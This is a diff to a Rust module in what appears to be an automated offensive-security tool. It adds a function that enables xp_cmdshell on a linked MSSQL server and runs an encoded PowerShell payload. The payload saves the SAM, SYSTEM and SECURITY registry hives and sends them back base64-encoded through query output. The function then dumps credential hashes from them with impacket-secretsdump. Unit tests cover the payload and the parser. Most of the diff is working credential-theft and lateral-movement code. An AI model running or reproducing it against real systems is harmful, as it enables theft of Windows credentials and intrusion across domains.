@@ -1,6 +1,7 @@
 //! MSSQL tool executors.
 
-use anyhow::Result;
+use anyhow::{Context, Result};
+use base64::Engine;
 use serde_json::Value;
 
 use crate::args::{optional_bool, optional_str, required_str};
@@ -282,6 +283,229 @@ pub async fn mssql_openquery(args: &Value) -> Result<ToolOutput> {
     mssql_query(mssql_from_args(args)?, &full_query).await
 }
 
+/// Delimiter markers embedded in the PowerShell hive-exfil payload.
+///
+/// Extracted as constants so the parser and the payload builder can't drift.
+/// The `___ARES_HIVE_*` prefix is unusual enough that random xp_cmdshell
+/// noise (whoami output, PS errors, mssqlclient row separators) won't
+/// collide with the delimiter scan.
+const HIVE_MARK_SAM_BEGIN: &str = "___ARES_HIVE_SAM_B64___";
+const HIVE_MARK_SAM_END: &str = "___ARES_HIVE_SAM_END___";
+const HIVE_MARK_SYSTEM_BEGIN: &str = "___ARES_HIVE_SYSTEM_B64___";
+const HIVE_MARK_SYSTEM_END: &str = "___ARES_HIVE_SYSTEM_END___";
+const HIVE_MARK_SECURITY_BEGIN: &str = "___ARES_HIVE_SECURITY_B64___";
+const HIVE_MARK_SECURITY_END: &str = "___ARES_HIVE_SECURITY_END___";
+
+/// PowerShell payload that reg-saves SAM/SYSTEM/SECURITY on the target and
+/// emits each hive as one long base64 line between delimiter rows. The
+/// caller wraps this in `powershell -EncodedCommand <utf16le-b64>` so
+/// impacket's `xp_cmdshell` layer never has to double-quote the payload
+/// through the SQL `EXEC ('...') AT [link]` wrapper.
+///
+/// Uses `[Console]::Out.WriteLine` (not `Write-Host`) so PowerShell's host
+/// wrapping doesn't insert line breaks into the base64 blobs — the hive
+/// binary MUST arrive as a single continuous line per hive or the offline
+/// impacket-secretsdump parse will fail on truncated / spliced hive data.
+fn build_hive_dump_ps_script() -> String {
+    format!(
+        r#"$ErrorActionPreference='Stop'
+$t=$env:TEMP
+$a="$t\a.hive";$b="$t\b.hive";$c="$t\c.hive"
+reg save HKLM\SAM $a /y | Out-Null
+reg save HKLM\SYSTEM $b /y | Out-Null
+reg save HKLM\SECURITY $c /y | Out-Null
+[Console]::Out.WriteLine('{sam_begin}')
+[Console]::Out.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($a)))
+[Console]::Out.WriteLine('{sam_end}')
+[Console]::Out.WriteLine('{sys_begin}')
+[Console]::Out.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($b)))
+[Console]::Out.WriteLine('{sys_end}')
+[Console]::Out.WriteLine('{sec_begin}')
+[Console]::Out.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($c)))
+[Console]::Out.WriteLine('{sec_end}')
+Remove-Item $a,$b,$c -Force -ErrorAction SilentlyContinue"#,
+        sam_begin = HIVE_MARK_SAM_BEGIN,
+        sam_end = HIVE_MARK_SAM_END,
+        sys_begin = HIVE_MARK_SYSTEM_BEGIN,
+        sys_end = HIVE_MARK_SYSTEM_END,
+        sec_begin = HIVE_MARK_SECURITY_BEGIN,
+        sec_end = HIVE_MARK_SECURITY_END,
+    )
+}
+
+/// Encode a PowerShell script for `-EncodedCommand`: UTF-16LE bytes,
+/// standard-base64. This is the encoding `powershell.exe -EncodedCommand`
+/// expects and it means no single-quote / double-quote escaping is
+/// required through the `EXEC ('xp_cmdshell ''<cmd>''') AT [link]` wrapper.
+fn ps_encoded_command(script: &str) -> String {
+    let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
+    base64::engine::general_purpose::STANDARD.encode(utf16)
+}
+
+/// Extract the base64 payload framed by `begin` and `end` marker lines.
+///
+/// Whitespace-tolerant on both the marker lines and the payload — the
+/// payload is joined without any newlines to reconstruct the single-line
+/// base64 the PowerShell payload emits (impacket's mssqlclient adds column
+/// headers, row separators, and its own trailing linefeed which we must
+/// strip). Returns `None` if either marker is missing or the payload is
+/// empty.
+fn extract_hive_b64(output: &str, begin: &str, end: &str) -> Option<String> {
+    let start = output.find(begin)?;
+    let after_begin = &output[start + begin.len()..];
+    let end_rel = after_begin.find(end)?;
+    let inner = &after_begin[..end_rel];
+    let joined: String = inner
+        .lines()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .collect::<Vec<_>>()
+        .join("");
+    if joined.is_empty() {
+        None
+    } else {
+        Some(joined)
+    }
+}
+
+/// Parsed hive triple lifted out of the far-host xp_cmdshell result.
+#[cfg_attr(test, derive(Debug))]
+struct FarHostHives {
+    sam: Vec<u8>,
+    system: Vec<u8>,
+    security: Vec<u8>,
+}
+
+/// Decode the three delimited base64 chunks from the hive-dump PowerShell
+/// payload's output. Errors surface exactly which hive failed so the
+/// operator can tell whether the reg save or the base64 encode step is
+/// broken on the far host.
+fn parse_hive_dump_output(output: &str) -> Result<FarHostHives> {
+    let sam_b64 = extract_hive_b64(output, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END)
+        .context("SAM hive marker/payload missing from xp_cmdshell output")?;
+    let sys_b64 = extract_hive_b64(output, HIVE_MARK_SYSTEM_BEGIN, HIVE_MARK_SYSTEM_END)
+        .context("SYSTEM hive marker/payload missing from xp_cmdshell output")?;
+    let sec_b64 = extract_hive_b64(output, HIVE_MARK_SECURITY_BEGIN, HIVE_MARK_SECURITY_END)
+        .context("SECURITY hive marker/payload missing from xp_cmdshell output")?;
+    let sam = base64::engine::general_purpose::STANDARD
+        .decode(sam_b64.as_bytes())
+        .context("SAM hive base64 decode failed")?;
+    let system = base64::engine::general_purpose::STANDARD
+        .decode(sys_b64.as_bytes())
+        .context("SYSTEM hive base64 decode failed")?;
+    let security = base64::engine::general_purpose::STANDARD
+        .decode(sec_b64.as_bytes())
+        .context("SECURITY hive base64 decode failed")?;
+    Ok(FarHostHives {
+        sam,
+        system,
+        security,
+    })
+}
+
+/// Harvest SAM/SYSTEM/SECURITY hives from a linked (typically cross-forest)
+/// SQL host via `xp_cmdshell` on the link hop, then parse them locally with
+/// `impacket-secretsdump LOCAL`. The output is the standard secretsdump
+/// text — the existing secretsdump parser handles it verbatim, so hashes
+/// and cached-cred rows land in state through the normal discovery path.
+///
+/// This is the primitive that converts a link-pivot sysadmin foothold into
+/// far-forest OS credentials — before this tool existed, a confirmed
+/// sysadmin on a cross-forest linked SQL host was marked owned but no
+/// downstream cred harvest fired (SMB-based `auto_local_admin_secretsdump`
+/// needs an admin cred for the far domain, which by definition we do not
+/// have yet). See `orchestrator/automation/mssql_link_pivot.rs`.
+///
+/// Required args: `target`, `username`, `linked_server`
+/// Optional args: `password`, `hash`, `domain`, `windows_auth`,
+///                `impersonate_user`
+pub async fn mssql_far_host_secretsdump(args: &Value) -> Result<ToolOutput> {
+    let linked_server = required_str(args, "linked_server")?;
+    let impersonate_user = optional_str(args, "impersonate_user");
+
+    // Enable xp_cmdshell on the far side first — idempotent, safe to run
+    // even when it's already on.
+    let enable_hop = format!(
+        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
+         EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
+    );
+    let enable_full = wrap_execute_as(&enable_hop, impersonate_user);
+    let enable_out = mssql_query(mssql_from_args(args)?, &enable_full).await?;
+
+    let script = build_hive_dump_ps_script();
+    let encoded = ps_encoded_command(&script);
+    let ps_cmd = format!("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}");
+
+    let dump_hop = format!("EXEC ('xp_cmdshell ''{ps_cmd}''') AT [{linked_server}];");
+    let dump_full = wrap_execute_as(&dump_hop, impersonate_user);
+    let dump_out = mssql_query(mssql_from_args(args)?, &dump_full).await?;
+
+    // If the hive markers aren't in the output, hand the raw xp_cmdshell
+    // stdout+stderr back so the caller can see the actual failure (e.g.
+    // "Access is denied" from reg save when SQL runs as a non-privileged
+    // service account).
+    let combined = dump_out.combined_raw();
+    let hives = match parse_hive_dump_output(&combined) {
+        Ok(h) => h,
+        Err(e) => {
+            let msg = format!(
+                "mssql_far_host_secretsdump: hive extraction failed — {e:?}\n\
+                 xp_cmdshell enable step exit={:?} success={}\n\
+                 xp_cmdshell dump step exit={:?} success={}\n\n\
+                 --- enable stdout ---\n{}\n--- dump combined ---\n{}",
+                enable_out.exit_code,
+                enable_out.success,
+                dump_out.exit_code,
+                dump_out.success,
+                enable_out.stdout,
+                combined,
+            );
+            return Ok(ToolOutput {
+                stdout: String::new(),
+                stderr: msg,
+                exit_code: dump_out.exit_code,
+                success: false,
+            });
+        }
+    };
+
+    // Save the decoded hives to a unique temp dir per-invocation so
+    // concurrent far-host dumps don't collide on the same paths.
+    let tmp_root = std::env::temp_dir();
+    let tag = uuid::Uuid::new_v4().simple().to_string();
+    let workdir = tmp_root.join(format!("ares-hive-{tag}"));
+    std::fs::create_dir_all(&workdir).with_context(|| {
+        format!(
+            "creating hive-dump workdir {} for mssql_far_host_secretsdump",
+            workdir.display()
+        )
+    })?;
+    let sam_path = workdir.join("sam.hive");
+    let sys_path = workdir.join("system.hive");
+    let sec_path = workdir.join("security.hive");
+    std::fs::write(&sam_path, &hives.sam).context("writing sam.hive")?;
+    std::fs::write(&sys_path, &hives.system).context("writing system.hive")?;
+    std::fs::write(&sec_path, &hives.security).context("writing security.hive")?;
+
+    let sd = CommandBuilder::new("impacket-secretsdump")
+        .arg("-sam")
+        .arg(sam_path.to_string_lossy().to_string())
+        .arg("-system")
+        .arg(sys_path.to_string_lossy().to_string())
+        .arg("-security")
+        .arg(sec_path.to_string_lossy().to_string())
+        .arg("LOCAL")
+        .timeout_secs(180)
+        .execute()
+        .await;
+
+    // Always try to clean up the hive files, even if secretsdump errored,
+    // so a series of failures doesn't leak megabytes of registry hives.
+    let _ = std::fs::remove_dir_all(&workdir);
+
+    sd
+}
+
 /// Coerce NTLM authentication from a MSSQL server via xp_dirtree.
 ///
 /// Required args: `target`, `username`, `listener_ip`
@@ -296,10 +520,156 @@ pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
 
 #[cfg(test)]
 mod tests {
-    use super::{build_linked_exec_hop, mssql_auth_args};
+    use super::{
+        build_hive_dump_ps_script, build_linked_exec_hop, extract_hive_b64, mssql_auth_args,
+        parse_hive_dump_output, ps_encoded_command, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END,
+        HIVE_MARK_SECURITY_BEGIN, HIVE_MARK_SECURITY_END, HIVE_MARK_SYSTEM_BEGIN,
+        HIVE_MARK_SYSTEM_END,
+    };
     use crate::args::{optional_bool, optional_str, required_str};
     use crate::credentials;
+    use base64::Engine;
     use serde_json::json;
+
+    // ── far-host hive-dump helpers ──────────────────────────────────────
+
+    #[test]
+    fn ps_encoded_command_roundtrips_utf16le_base64() {
+        // -EncodedCommand takes UTF-16LE base64. Verify by decoding.
+        let encoded = ps_encoded_command("Write-Host 'ok'");
+        let bytes = base64::engine::general_purpose::STANDARD
+            .decode(encoded.as_bytes())
+            .expect("valid base64");
+        assert_eq!(bytes.len() % 2, 0, "UTF-16LE payload must be even-length");
+        let utf16: Vec<u16> = bytes
+            .chunks_exact(2)
+            .map(|c| u16::from_le_bytes([c[0], c[1]]))
+            .collect();
+        let decoded = String::from_utf16(&utf16).expect("valid utf-16");
+        assert_eq!(decoded, "Write-Host 'ok'");
+    }
+
+    #[test]
+    fn hive_dump_script_contains_all_three_delimiters() {
+        // If a delimiter is missing the parser will silently drop that hive
+        // — this test guards against a stray edit to the payload.
+        let script = build_hive_dump_ps_script();
+        assert!(script.contains(HIVE_MARK_SAM_BEGIN));
+        assert!(script.contains(HIVE_MARK_SAM_END));
+        assert!(script.contains(HIVE_MARK_SYSTEM_BEGIN));
+        assert!(script.contains(HIVE_MARK_SYSTEM_END));
+        assert!(script.contains(HIVE_MARK_SECURITY_BEGIN));
+        assert!(script.contains(HIVE_MARK_SECURITY_END));
+        // Must reg-save all three hives, in the /y (overwrite) form.
+        assert!(script.contains("reg save HKLM\\SAM"));
+        assert!(script.contains("reg save HKLM\\SYSTEM"));
+        assert!(script.contains("reg save HKLM\\SECURITY"));
+    }
+
+    #[test]
+    fn hive_dump_script_uses_console_out_writeline_not_write_host() {
+        // Write-Host wraps at the PowerShell host's console width, which
+        // splices newlines into the base64 blobs and breaks the offline
+        // secretsdump parse. Must use `[Console]::Out.WriteLine` for the
+        // hive lines.
+        let script = build_hive_dump_ps_script();
+        assert!(
+            script.contains("[Console]::Out.WriteLine"),
+            "hive lines must go through [Console]::Out.WriteLine to avoid host-width wrapping"
+        );
+    }
+
+    #[test]
+    fn extract_hive_b64_finds_delimited_payload() {
+        let out = format!(
+            "SQL> EXEC ('xp_cmdshell') AT [LINK]\nheader\n---\n{begin}\nAAAA\n{end}\nother garbage",
+            begin = HIVE_MARK_SAM_BEGIN,
+            end = HIVE_MARK_SAM_END,
+        );
+        let got = extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END);
+        assert_eq!(got.as_deref(), Some("AAAA"));
+    }
+
+    #[test]
+    fn extract_hive_b64_joins_multiline_payload() {
+        // impacket's mssqlclient may insert its own row-separator whitespace
+        // around the base64 line — the extractor must strip empty lines and
+        // rejoin so the base64 decodes cleanly.
+        let out = format!(
+            "{begin}\n   \nAAAA\n\nBBBB\n{end}",
+            begin = HIVE_MARK_SAM_BEGIN,
+            end = HIVE_MARK_SAM_END,
+        );
+        assert_eq!(
+            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END).as_deref(),
+            Some("AAAABBBB")
+        );
+    }
+
+    #[test]
+    fn extract_hive_b64_returns_none_when_marker_missing() {
+        assert_eq!(
+            extract_hive_b64("no markers here", HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END),
+            None
+        );
+    }
+
+    #[test]
+    fn extract_hive_b64_returns_none_on_empty_payload() {
+        let out = format!(
+            "{begin}\n\n\n{end}",
+            begin = HIVE_MARK_SAM_BEGIN,
+            end = HIVE_MARK_SAM_END,
+        );
+        assert_eq!(
+            extract_hive_b64(&out, HIVE_MARK_SAM_BEGIN, HIVE_MARK_SAM_END),
+            None
+        );
+    }
+
+    #[test]
+    fn parse_hive_dump_output_decodes_all_three_hives() {
+        let b64 = base64::engine::general_purpose::STANDARD.encode(b"regf-goes-here");
+        let out = format!(
+            "row header\n\
+             {sam_b}\n{b}\n{sam_e}\n\
+             {sys_b}\n{b}\n{sys_e}\n\
+             {sec_b}\n{b}\n{sec_e}\n",
+            sam_b = HIVE_MARK_SAM_BEGIN,
+            sam_e = HIVE_MARK_SAM_END,
+            sys_b = HIVE_MARK_SYSTEM_BEGIN,
+            sys_e = HIVE_MARK_SYSTEM_END,
+            sec_b = HIVE_MARK_SECURITY_BEGIN,
+            sec_e = HIVE_MARK_SECURITY_END,
+            b = b64,
+        );
+        let hives = parse_hive_dump_output(&out).expect("all three hives decode");
+        assert_eq!(hives.sam, b"regf-goes-here");
+        assert_eq!(hives.system, b"regf-goes-here");
+        assert_eq!(hives.security, b"regf-goes-here");
+    }
+
+    #[test]
+    fn parse_hive_dump_output_names_missing_hive_in_error() {
+        // Diagnostic clarity: the error message must identify which hive
+        // failed so the operator can tell whether reg save is denied for
+        // one hive class (e.g. SECURITY without SeBackupPrivilege) but not
+        // the others.
+        let b64 = base64::engine::general_purpose::STANDARD.encode(b"x");
+        let out = format!(
+            "{sam_b}\n{b}\n{sam_e}\n{sys_b}\n{b}\n{sys_e}\n",
+            sam_b = HIVE_MARK_SAM_BEGIN,
+            sam_e = HIVE_MARK_SAM_END,
+            sys_b = HIVE_MARK_SYSTEM_BEGIN,
+            sys_e = HIVE_MARK_SYSTEM_END,
+            b = b64,
+        );
+        let err = parse_hive_dump_output(&out).unwrap_err().to_string();
+        assert!(
+            err.contains("SECURITY"),
+            "missing-hive error must name SECURITY: got {err:?}"
+        );
+    }
 
     #[test]
     fn auth_args_password_form() {
